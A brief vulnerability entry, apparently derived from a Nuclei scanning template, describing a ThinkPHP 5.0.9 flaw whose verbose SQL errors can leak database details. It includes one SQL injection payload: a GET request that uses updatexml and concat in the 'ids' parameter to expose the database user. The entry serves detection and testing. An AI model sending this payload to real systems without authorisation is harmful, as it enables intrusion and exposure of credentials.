# Vulnerability: ThinkPHP 5.0.9 - Information Disclosure
**Classification:** THINKPHP
**Source:** Nuclei Template (`thinkphp-509-information-disclosure.yaml`)

## Description
ThinkPHP 5.0.9 includes verbose SQL error message that can reveal sensitive information including database credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1
```

